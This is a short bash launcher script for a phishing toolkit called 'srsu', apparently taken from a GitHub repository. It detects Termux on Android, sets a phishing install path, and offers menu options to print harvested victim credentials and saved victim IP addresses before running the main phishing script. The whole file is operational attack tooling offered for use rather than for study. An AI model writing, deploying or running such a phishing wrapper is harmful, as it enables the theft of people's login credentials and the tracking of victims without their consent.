#!/bin/bash

# https://github.com/ultra303/srsu

if [[ $(uname -o) == *'Android'* ]];then
	PHISHING_ROOT="/data/data/com.termux/files/usr/opt/srsu"
else
	export PHISHING_ROOT="/opt/phishing"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
	echo "To run Phishing type \`phishing\` in your cmd"
	echo
	echo "Help:"
	echo " -h | help : Print this menu & Exit"
	echo " -c | auth : View Saved Credentials"
	echo " -i | ip   : View Saved Victim IP"
	echo
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
	cat $PHISHING_ROOT/auth/usernames.dat 2> /dev/null || { 
		echo "No Credentials Found !"
		exit 1
	}
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
	cat $PHISHING_ROOT/auth/ip.txt 2> /dev/null || {
		echo "No Saved IP Found !"
		exit 1
	}
else
	cd $PHISHING_ROOT
	bash ./srsu.sh
fi
